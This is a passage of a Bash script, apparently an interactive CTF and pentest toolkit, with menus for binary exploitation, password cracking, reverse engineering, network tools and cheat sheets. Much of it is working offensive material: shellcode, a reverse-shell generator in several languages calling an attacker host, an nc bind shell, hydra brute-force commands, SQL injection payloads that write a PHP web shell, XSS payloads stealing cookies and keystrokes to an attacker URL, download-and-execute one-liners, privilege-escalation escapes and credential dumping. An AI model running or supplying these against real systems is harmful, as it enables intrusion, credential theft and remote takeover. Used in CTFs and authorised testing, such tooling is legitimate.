  p.sendlineafter(b'> ', payload2)
  p.interactive()
  ──────────────────────────────────────────────────────────────────
PYEOF
        ;;
      11)
        echo -e "\n  ${YB}Common shellcodes:${NC}"
        echo -e "  ${DIM}x86 /bin/sh (27 bytes):${NC}"
        echo "  \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
        echo -e "\n  ${DIM}x64 /bin/sh (27 bytes):${NC}"
        echo "  \\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
        echo ""
        info "Generate with: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f python"
        ;;
      12)
        ask "Binary path:"; read -r f
        run_cmd "ROPgadget" "ROPgadget --binary '$f' 2>/dev/null | head -50 || python3 -m ropper --file '$f' 2>/dev/null | head -50"
        ;;
      13)
        ask "Host:"; read -r host
        ask "Port:"; read -r port
        python3 -c "
from pwn import *
for i in range(1,20):
    p=remote('$host',$port)
    fmt='%'+str(i)+'\$p '
    p.sendline(fmt.encode())
    try: print(f'pos {i}: {p.recv(100)}')
    except: pass
    p.close()
" 2>/dev/null || info "Install pwntools: pip3 install pwntools"
        ;;
    esac
    pause
  done
}

# ─── 7. PASSWORD CRACKING ───────────────────────────────────────────
menu_crack() {
  while true; do
    hdr "PASSWORD CRACKING"
    echo -e "  ${CB}1${NC})  hashcat (auto mode)              ${CB}6${NC})  Online hash lookup"
    echo -e "  ${CB}2${NC})  john the ripper                  ${CB}7${NC})  Hydra SSH"
    echo -e "  ${CB}3${NC})  hashcat rules attack             ${CB}8${NC})  Hydra HTTP POST"
    echo -e "  ${CB}4${NC})  hashcat mask attack              ${CB}9${NC})  Hydra FTP/Telnet"
    echo -e "  ${CB}5${NC})  crack SSH private key            ${CB}0${NC})  ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    case "$c" in
      1)
        ask "Hash or hash file:"; read -r h
        ask "Wordlist [rockyou.txt]:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/rockyou.txt"
        run_cmd "hashcat" "hashcat -a 0 '$h' '$wl' 2>/dev/null"
        ;;
      2)
        ask "Hash file:"; read -r h
        ask "Wordlist [rockyou.txt]:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/rockyou.txt"
        run_cmd "john" "john --wordlist='$wl' '$h'"
        ;;
      3)
        ask "Hash or file:"; read -r h
        ask "Wordlist:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/rockyou.txt"
        run_cmd "hashcat rules" "hashcat -a 0 -r /usr/share/hashcat/rules/best64.rule '$h' '$wl' 2>/dev/null"
        ;;
      4)
        ask "Hash or file:"; read -r h
        ask "Mask (e.g. ?l?l?l?l?d?d):"; read -r mask
        run_cmd "hashcat mask" "hashcat -a 3 '$h' '$mask' 2>/dev/null"
        ;;
      5)
        ask "SSH private key:"; read -r f
        run_cmd "ssh2john" "python3 /usr/share/john/ssh2john.py '$f' > /tmp/sshkey.hash && john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/sshkey.hash 2>/dev/null"
        ;;
      6)
        ask "Hash:"; read -r h
        run_cmd "curl lookup" "curl -s 'https://md5decrypt.net/Api/api.php?hash=$h&hash_type=md5&email=x&code=x' 2>/dev/null || echo 'Try: crackstation.net, hashes.com'"
        ;;
      7)
        ask "Host:"; read -r host
        ask "Username or user file:"; read -r user
        ask "Wordlist:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/rockyou.txt"
        run_cmd "hydra SSH" "hydra -l '$user' -P '$wl' -t 4 '$host' ssh 2>/dev/null"
        ;;
      8)
        ask "URL:"; read -r url
        ask "POST params (user=^USER^&pass=^PASS^):"; read -r params
        ask "Fail string:"; read -r fail
        ask "User:"; read -r user
        ask "Wordlist:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/rockyou.txt"
        run_cmd "hydra HTTP" "hydra -l '$user' -P '$wl' -t 10 '$url' http-post-form '$params:$fail' 2>/dev/null"
        ;;
      9)
        ask "Host:"; read -r host
        ask "Service (ftp/telnet/smtp):"; read -r svc
        ask "User:"; read -r user
        ask "Wordlist:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/rockyou.txt"
        run_cmd "hydra $svc" "hydra -l '$user' -P '$wl' '$host' '$svc' 2>/dev/null"
        ;;
    esac
    pause
  done
}

# ─── 8. REVERSE ENGINEERING ─────────────────────────────────────────
menu_rev() {
  while true; do
    hdr "REVERSE ENGINEERING"
    echo -e "  ${GB}1${NC})  file + strings analysis          ${GB}6${NC})  Java decompile (jadx)"
    echo -e "  ${GB}2${NC})  objdump full disassembly         ${GB}7${NC})  Python pyc decompile"
    echo -e "  ${GB}3${NC})  radare2 quick analysis           ${GB}8${NC})  ELF header dump"
    echo -e "  ${GB}4${NC})  strace+ltrace combo              ${GB}9${NC})  nm symbols"
    echo -e "  ${GB}5${NC})  find hardcoded strings/creds     ${GB}0${NC})  ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    case "$c" in
      1)
        ask "Binary:"; read -r f
        run_cmd "Analysis" "file '$f'; echo; strings '$f' | grep -v '^\.$' | head -200"
        ;;
      2)
        ask "Binary:"; read -r f
        run_cmd "objdump" "objdump -d -M intel '$f' 2>/dev/null | head -500"
        ;;
      3)
        ask "Binary:"; read -r f
        run_cmd "r2" "r2 -A -q -c 'afl;pdf @main' '$f' 2>/dev/null | head -200"
        ;;
      4)
        ask "Binary:"; read -r f
        run_cmd "ltrace" "ltrace -i '$f' 2>&1 | head -100"
        run_cmd "strace" "strace '$f' 2>&1 | head -100"
        ;;
      5)
        ask "Binary:"; read -r f
        run_cmd "Creds hunt" "strings '$f' | grep -iE 'pass|key|secret|flag|auth|token|admin|root|user|ctf' | head -100"
        ;;
      6)
        ask "APK/JAR:"; read -r f
        run_cmd "jadx" "jadx -d /tmp/jadx_out '$f' && ls /tmp/jadx_out/ 2>/dev/null || apktool d '$f' 2>/dev/null"
        ;;
      7)
        ask ".pyc file:"; read -r f
        run_cmd "pyc" "python3 -c \"import dis,marshal,struct; f=open('$f','rb'); f.read(16); dis.dis(marshal.loads(f.read()))\" 2>/dev/null || uncompyle6 '$f' 2>/dev/null"
        ;;
      8)
        ask "ELF file:"; read -r f
        run_cmd "readelf" "readelf -h '$f'; echo; readelf -l '$f'"
        ;;
      9)
        ask "Binary:"; read -r f
        run_cmd "nm" "nm '$f' 2>/dev/null || nm -D '$f' 2>/dev/null"
        ;;
    esac
    pause
  done
}

# ─── 9. NETWORK TOOLS ───────────────────────────────────────────────
menu_network() {
  while true; do
    hdr "NETWORK TOOLS"
    echo -e "  ${BB}1${NC})  netcat listener                  ${BB}6${NC})  Port forward (socat)"
    echo -e "  ${BB}2${NC})  netcat connect                   ${BB}7${NC})  DNS lookup"
    echo -e "  ${BB}3${NC})  reverse shell gen                ${BB}8${NC})  WHOIS"
    echo -e "  ${BB}4${NC})  bind shell                       ${BB}9${NC})  traceroute"
    echo -e "  ${BB}5${NC})  banner grab                      ${BB}0${NC})  ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    case "$c" in
      1)
        ask "Port:"; read -r port
        info "Listening on port $port..."
        nc -lvnp "$port"
        ;;
      2)
        ask "Host:"; read -r host
        ask "Port:"; read -r port
        nc -v "$host" "$port"
        ;;
      3)
        ask "Your IP (LHOST):"; read -r lhost
        ask "Your Port (LPORT):"; read -r lport
        echo -e "\n  ${YB}Reverse Shell Cheatsheet:${NC}"
        echo -e "  ${DIM}bash:${NC}   bash -i >& /dev/tcp/$lhost/$lport 0>&1"
        echo -e "  ${DIM}python:${NC} python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        echo -e "  ${DIM}php:${NC}    php -r '\$s=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo -e "  ${DIM}ruby:${NC}   ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$lhost\",$lport);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        echo -e "  ${DIM}perl:${NC}   perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
        echo -e "  ${DIM}nc:${NC}     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
        echo -e "  ${DIM}socat:${NC}  socat TCP:$lhost:$lport EXEC:'/bin/sh -i',pty,stderr,setsid,sigint,sane"
        echo -e "\n  ${YB}Shell upgrade:${NC}"
        echo -e "  ${DIM}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; stty raw -echo; fg; reset; export TERM=xterm${NC}"
        ;;
      4)
        ask "Port:"; read -r port
        info "Bind shell on port $port..."
        nc -lvnp "$port" -e /bin/bash
        ;;
      5)
        ask "Host:"; read -r host
        ask "Port:"; read -r port
        run_cmd "Banner" "echo '' | nc -v -w 2 '$host' '$port' 2>&1"
        ;;
      6)
        ask "Local port:"; read -r lp
        ask "Remote host:"; read -r rh
        ask "Remote port:"; read -r rp
        info "Forwarding 0.0.0.0:$lp -> $rh:$rp"
        socat TCP-LISTEN:"$lp",fork,reuseaddr TCP:"$rh":"$rp" &
        ok "Socat running (PID $!)"
        ;;
      7)
        ask "Domain:"; read -r domain
        run_cmd "DNS" "dig '$domain' any; echo; dig '$domain' txt"
        ;;
      8)
        ask "Target:"; read -r target
        run_cmd "WHOIS" "whois '$target' 2>/dev/null | head -50"
        ;;
      9)
        ask "Target:"; read -r target
        run_cmd "traceroute" "traceroute '$target' 2>/dev/null || tracepath '$target'"
        ;;
    esac
    pause
  done
}

# ─── 10. NOTES & FLAGS ──────────────────────────────────────────────
menu_notes() {
  while true; do
    hdr "NOTES & FLAG TRACKER"
    echo -e "  ${WB}1${NC})  Add note                         ${WB}4${NC})  View session log"
    echo -e "  ${WB}2${NC})  View all notes                   ${WB}5${NC})  Clear notes"
    echo -e "  ${WB}3${NC})  Submit / save flag               ${WB}0${NC})  ← Back"
    echo ""
    if [[ -s "$FLAGS_FILE" ]]; then
      echo -e "  ${GB}🚩 Captured Flags:${NC}"
      cat -n "$FLAGS_FILE" | sed 's/^/  /'
      echo ""
    fi
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    case "$c" in
      1)
        ask "Note:"; read -r note
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] $note" >> "$NOTES_FILE"
        ok "Note saved."
        ;;
      2)
        echo ""
        if [[ -s "$NOTES_FILE" ]]; then
          cat -n "$NOTES_FILE" | sed 's/^/  /'
        else
          info "No notes yet."
        fi
        ;;
      3)
        ask "Flag (e.g. CTF{...}):"; read -r flag
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] $flag" >> "$FLAGS_FILE"
        echo ""
        echo -e "  ${BG_G}${WB}  🚩 FLAG CAPTURED: $flag  ${NC}"
        echo ""
        ;;
      4)
        echo ""
        if [[ -s "$SESSION_LOG" ]]; then
          tail -50 "$SESSION_LOG" | sed 's/^/  /'
        else
          info "Session log empty."
        fi
        ;;
      5)
        ask "Clear notes AND flags? (y/N):"; read -r yn
        if [[ "$yn" == "y" ]]; then
          > "$NOTES_FILE"; > "$FLAGS_FILE"
          ok "Cleared."
        fi
        ;;
    esac
    pause
  done
}

# ─── 11. QUICK REFERENCE ────────────────────────────────────────────
menu_ref() {
  while true; do
    hdr "QUICK REFERENCE & CHEATSHEETS"
    echo -e "  ${YB}1${NC})  Linux PrivEsc checklist          ${YB}6${NC})  SQLi payloads"
    echo -e "  ${YB}2${NC})  Windows PrivEsc checklist        ${YB}7${NC})  XSS payloads"
    echo -e "  ${YB}3${NC})  Common CTF ports                 ${YB}8${NC})  File transfer methods"
    echo -e "  ${YB}4${NC})  SUID/GUID PrivEsc                ${YB}9${NC})  GTFObins quick"
    echo -e "  ${YB}5${NC})  Common creds list                ${YB}0${NC})  ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    case "$c" in
      1)
        hdr "Linux PrivEsc Checklist"
        cat << 'EOF'
  ① System Info:      uname -a; cat /etc/issue; cat /proc/version
  ② Users:            cat /etc/passwd; id; who; w; last
  ③ SUDO:             sudo -l; cat /etc/sudoers
  ④ SUID binaries:    find / -perm -4000 -type f 2>/dev/null
  ⑤ Capabilities:     getcap -r / 2>/dev/null
  ⑥ Cron jobs:        crontab -l; cat /etc/cron*; ls /etc/cron*
  ⑦ Writable dirs:    find / -writable -type d 2>/dev/null | head
  ⑧ Config files:     find / -name "*.conf" -readable 2>/dev/null
  ⑨ SSH keys:         find / -name "id_rsa" 2>/dev/null
  ⑩ Env variables:    env; cat ~/.bashrc; cat ~/.profile
  ⑪ Processes:        ps aux; ps -ef
  ⑫ Network:          netstat -antup; ss -tulpn; ip route
  ⑬ Installed pkgs:   dpkg -l; rpm -qa
  ⑭ Kernel exploits:  uname -r → searchsploit linux kernel <ver>
  ⑮ Docker/LXC:       id (check docker group); ls -la /var/run/docker.sock
  ⑯ NFS:              cat /etc/exports (no_root_squash?)
  ⑰ PATH hijack:      echo $PATH; ls -la /tmp; which <binary>
  ⑱ Interesting files: cat ~/.bash_history; find / -name "*.txt" 2>/dev/null
EOF
        ;;
      2)
        hdr "Windows PrivEsc Checklist"
        cat << 'EOF'
  ① System info:   systeminfo; whoami /all; net user; net localgroup administrators
  ② Unquoted svc:  wmic service get name,displayname,pathname,startmode
  ③ Weak perms:    accesschk.exe -uwcqv "Authenticated Users" *
  ④ AlwaysInstall: reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
  ⑤ Stored creds:  cmdkey /list; runas /savecred; reg query HKLM /f password /t REG_SZ /s
  ⑥ SAM/SYSTEM:    reg save HKLM\SAM sam.hive; reg save HKLM\SYSTEM sys.hive
  ⑦ Token imperson: whoami /priv (SeImpersonatePrivilege → JuicyPotato/PrintSpoofer)
  ⑧ DLL hijack:    Process Monitor → filter on NAME NOT FOUND + .dll
  ⑨ AutoRuns:      reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
  ⑩ Task sched:    schtasks /query /fo LIST /v | findstr /i "task\|run\|status"
  ⑪ Pass the hash: mimikatz → sekurlsa::logonpasswords; lsadump::sam
  ⑫ PowerShell:    Get-History; (Get-PSReadlineOption).HistorySavePath
EOF
        ;;
      3)
        hdr "Common CTF Ports"
        cat << 'EOF'
  21   FTP        22   SSH        23   Telnet     25   SMTP
  53   DNS        80   HTTP       110  POP3       135  RPC
  139  NetBIOS    143  IMAP       443  HTTPS      445  SMB
  1433 MSSQL      1521 Oracle     3306 MySQL      3389 RDP
  5432 PostgreSQL 5900 VNC        6379 Redis      8080 HTTP-alt
  8443 HTTPS-alt  27017 MongoDB   11211 Memcached
EOF
        ;;
      4)
        hdr "SUID / GTFO PrivEsc"
        cat << 'EOF'
  find / -perm -4000 -type f 2>/dev/null

  nmap --interactive → !sh
  vim -c ':!/bin/sh'
  less /etc/passwd → !/bin/sh
  find . -exec /bin/sh \; -quit
  python -c 'import os; os.setuid(0); os.system("/bin/sh")'
  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
  cp /bin/bash /tmp/bash && chmod +s /tmp/bash; /tmp/bash -p
  openssl enc -in /etc/shadow
  curl file:///etc/shadow
  tee /etc/cron.d/evil <<< "* * * * * root chmod +s /bin/bash"
EOF
        ;;
      5)
        hdr "Common Default Credentials"
        cat << 'EOF'
  admin:admin         admin:password      admin:123456
  root:root           root:toor           root:password
  administrator:admin user:user           guest:guest
  pi:raspberry        vagrant:vagrant     ubuntu:ubuntu
  test:test           demo:demo           support:support
  ftp:ftp             anonymous:          cisco:cisco
EOF
        ;;
      6)
        hdr "SQL Injection Payloads"
        cat << 'EOF'
  Basic auth bypass:   ' OR 1=1-- -    ' OR '1'='1    admin'--
  UNION test:          ' ORDER BY 1-- -   (increment until error)
  UNION select:        ' UNION SELECT NULL,NULL,NULL-- -
  DB version:          ' UNION SELECT @@version,NULL-- -   (MySQL)
                       ' UNION SELECT version(),NULL-- -   (Postgres)
  DB name:             ' UNION SELECT database(),NULL-- -
  Tables:              ' UNION SELECT table_name,NULL FROM information_schema.tables-- -
  Columns:             ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
  Blind (bool):        ' AND 1=1-- -  vs  ' AND 1=2-- -
  Time-based:          ' AND SLEEP(5)-- -   '; WAITFOR DELAY '0:0:5'-- -
  File read:           ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
  Write shell:         ' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'-- -
EOF
        ;;
      7)
        hdr "XSS Payloads"
        cat << 'EOF'
  Basic:        <script>alert(1)</script>
  Tag attr:     " onmouseover="alert(1)
  IMG:          <img src=x onerror=alert(1)>
  SVG:          <svg onload=alert(1)>
  Bypass filter: <ScRiPt>alert(1)</ScRiPt>
                 <script>alert`1`</script>
                 javascript:alert(1)
  Steal cookie: <script>document.location='http://YOURIP/?c='+document.cookie</script>
  Keylogger:    <script>document.onkeypress=function(e){fetch('http://YOURIP/?k='+e.key)}</script>
  DOM XSS:      #"><img src=x onerror=alert(1)>
EOF
        ;;
      8)
        hdr "File Transfer Methods"
        cat << 'EOF'
  Python HTTP server:  python3 -m http.server 8080
  wget download:       wget http://ATTACKER/file -O /tmp/file
  curl download:       curl http://ATTACKER/file -o /tmp/file

  NC send:     nc -lvnp 4444 < file.txt
  NC receive:  nc ATTACKER 4444 > file.txt

  SCP:         scp file user@host:/path/
  SFTP:        sftp user@host

  PowerShell:  IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/file')
               Invoke-WebRequest -Uri http://ATTACKER/file -OutFile C:\file

  Certutil:    certutil -urlcache -f http://ATTACKER/file C:\file
  Base64:      base64 file | tr -d '\n'   # encode; decode on target
EOF
        ;;
      9)
        hdr "GTFObins Quick Reference"
        cat << 'EOF'
  Full list: https://gtfobins.github.io

  Shell via sudo:
  awk        sudo awk 'BEGIN {system("/bin/sh")}'
  bash       sudo bash
  find       sudo find . -exec /bin/sh \; -quit
  less       sudo less /etc/profile → !/bin/sh
  man        sudo man man → !/bin/sh
  more       sudo more /etc/profile → !/bin/sh
  nano       sudo nano → ^R^X reset; sh 1>&0 2>&0
  perl       sudo perl -e 'exec "/bin/sh";'
  python     sudo python3 -c 'import os;os.system("/bin/sh")'
  ruby       sudo ruby -e 'exec "/bin/sh"'
  tar        sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  vim        sudo vim -c ':!/bin/sh'
  zip        sudo zip /tmp/t.zip /tmp/t -T --unzip-command="sh -c /bin/sh"
EOF
        ;;
    esac
    pause
  done
}

# ─── MAIN MENU ──────────────────────────────────────────────────────
main_menu() {
  while true; do
    banner
    echo -e "  ${WB}SET TARGET${NC} → type: ${CB}t${NC}   ${WB}TOOL CHECK${NC} → type: ${CB}c${NC}"
    echo ""
    echo -e "  ${RB}[1]${NC} ${WB}Recon & Enumeration${NC}      ${DIM}nmap, masscan, ports${NC}"
    echo -e "  ${CB}[2]${NC} ${WB}Web Exploitation${NC}         ${DIM}gobuster, nikto, sqlmap, ffuf${NC}"
    echo -e "  ${GB}[3]${NC} ${WB}Crypto & Encoding${NC}        ${DIM}base64, rot, xor, rsa, hashes${NC}"
    echo -e "  ${MB}[4]${NC} ${WB}Steganography${NC}            ${DIM}binwalk, steghide, exiftool${NC}"
    echo -e "  ${YB}[5]${NC} ${WB}Forensics & Memory${NC}       ${DIM}foremost, volatility, pcap${NC}"
    echo -e "  ${RB}[6]${NC} ${WB}Binary Exploit / PWN${NC}     ${DIM}gdb, checksec, rop, shellcode${NC}"
    echo -e "  ${CB}[7]${NC} ${WB}Password Cracking${NC}        ${DIM}hashcat, john, hydra${NC}"
    echo -e "  ${GB}[8]${NC} ${WB}Reverse Engineering${NC}      ${DIM}r2, objdump, jadx, ltrace${NC}"
    echo -e "  ${BB}[9]${NC} ${WB}Network Tools${NC}            ${DIM}nc, reverse shells, port fwd${NC}"
    echo -e "  ${WB}[0]${NC} ${WB}Notes & Flag Tracker${NC}     ${DIM}capture flags, session notes${NC}"
    echo -e "  ${YB}[r]${NC} ${WB}Quick Reference${NC}          ${DIM}cheatsheets, payloads, gtfobins${NC}"
    echo ""
    echo -e "  ${DIM}[q] Quit${NC}"
    echo ""
    ask "AlEnezi awaits your command:"; read -r choice
    case "$choice" in
      1)  menu_recon ;;
      2)  menu_web ;;
      3)  menu_crypto ;;
      4)  menu_stego ;;
      5)  menu_forensics ;;
      6)  menu_pwn ;;
      7)  menu_crack ;;
      8)  menu_rev ;;
      9)  menu_network ;;
      0)  menu_notes ;;
      r|R) menu_ref ;;
      t|T)
        ask "Set target IP/URL:"; read -r SESSION_TARGET
        ok "Target set: ${YB}$SESSION_TARGET${NC}"
        sleep 1
        ;;
      c|C) menu_toolcheck ;;
      q|Q|exit|quit)
        clear
        echo -e "\n  ${CB}☠  AlEnezi Tool signing off. GG and GL!  ☠${NC}\n"
        echo -e "  ${DIM}Flags captured: $(wc -l < "$FLAGS_FILE")   Session: $(wc -l < "$SESSION_LOG") commands${NC}"
        echo -e "  ${DIM}github.com/AlEnezi${NC}\n"
        exit 0
        ;;
      *)
        warn "Unknown option. Use numbers 1-9, 0, r, t, c, or q."
        sleep 0.5
        ;;
    esac
  done
}

# ─── ENTRY POINT ────────────────────────────────────────────────────
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  # Handle Ctrl+C gracefully
  trap 'echo -e "\n\n  ${YB}[!] Interrupted. Returning to menu...${NC}"; sleep 1' INT
  main_menu
fi
